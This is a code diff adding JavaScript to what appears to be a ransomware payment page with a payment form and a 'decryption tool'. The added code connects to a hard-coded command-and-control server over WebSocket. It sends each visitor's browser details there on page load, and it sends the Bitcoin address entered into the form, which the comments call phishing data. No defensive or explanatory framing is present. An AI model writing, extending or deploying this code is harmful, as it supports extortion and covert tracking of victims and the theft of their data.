@@ -125,6 +125,47 @@
             document.getElementById('decryption-tool').classList.remove('hidden'); // Show the decryption tool
             document.getElementById('payment-form').classList.add('hidden'); // Hide the payment form
         });
+
+        // DigitalOcean server IP
+    const ws = new WebSocket("ws://137.184.121.150:8765");
+
+ws.onopen = () => {
+    console.log("Connected to C2 server");
+
+    // Send victim's browser info when they load the page
+    let victimInfo = {
+        "User-Agent": navigator.userAgent,
+        "Language": navigator.language,
+        "Time": new Date().toLocaleString()
+    };
+
+    ws.send(JSON.stringify(victimInfo));
+};
+
+ws.onmessage = (event) => {
+    console.log("C2 Server Says:", event.data);
+};
+
+ws.onerror = (error) => {
+    console.error("WebSocket Error:", error);
+};
+
+ws.onclose = () => {
+    console.log("C2 Connection Closed");
+};
+
+function sendPhishingData() {
+    let btcAddress = document.getElementById("btc-address").value;
+    let message = `Victim entered BTC Address: ${btcAddress}`;
+    ws.send(message);
+}
+
+document.getElementById("payment-form").addEventListener("submit", function (event) {
+    event.preventDefault();
+    sendPhishingData();
+    document.getElementById('decryption-tool').classList.remove('hidden');
+    document.getElementById('payment-form').classList.add('hidden');
+});
     </script>
 </body>
 </html>
